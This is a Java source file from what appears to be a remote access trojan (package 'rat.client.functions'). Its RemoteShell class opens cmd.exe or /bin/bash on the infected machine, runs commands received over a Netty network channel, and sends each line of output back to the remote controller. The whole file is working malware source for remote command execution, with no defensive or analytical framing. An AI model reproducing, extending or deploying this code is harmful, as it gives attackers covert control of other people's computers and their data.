package rat.client.functions;

import org.apache.commons.lang3.SystemUtils;
import org.jboss.netty.channel.Channel;
import rat.packets.RemoteShellResponsePacket;

import java.io.BufferedWriter;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.Scanner;

public class RemoteShell {

    private Channel channel;

    private volatile boolean active;

    private ProcessBuilder builder;

    private Process process;

    private volatile boolean processing;

    private BufferedWriter processInput;

    private List<String> processOutput;

    public RemoteShell() {

        if (SystemUtils.IS_OS_WINDOWS) {
            builder = new ProcessBuilder("cmd.exe");
        } else if (SystemUtils.IS_OS_MAC) { // TODO: this

        } else {
            builder = new ProcessBuilder("/bin/bash"); // hope its unix
        }

        builder.redirectErrorStream(true);
    }

    public void open(Channel channel) {
        this.channel = channel;

        if (process != null) {
            process.destroy();
        }
        try {
            process = builder.start();
        } catch (IOException e) {
            e.printStackTrace();
            return;
        }

        active = true;
        processInput = new BufferedWriter(new OutputStreamWriter(process.getOutputStream()));
        processOutput = Collections.synchronizedList(new ArrayList<>());
        startOutputListener();
    }

    public void executeCommand(String command) {
        try {
            processing = true;
            processInput.write(command);
            processInput.newLine();
            processInput.flush();

        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public void close() {
        active = false;

        try {
            processInput.write("exit");
            processInput.newLine();
            processInput.flush();
        } catch (IOException e) {
            e.printStackTrace();
        }

        if (process != null) {
            process.destroy();
            process = null;
        }
    }

    private void startOutputListener() {
        new Thread(() -> {
            Scanner scanner = new Scanner(process.getInputStream());
            while (scanner.hasNextLine() && active) {
                String responseLine = scanner.nextLine();
                channel.write(new RemoteShellResponsePacket(responseLine));
            }
        }).start();
    }
}
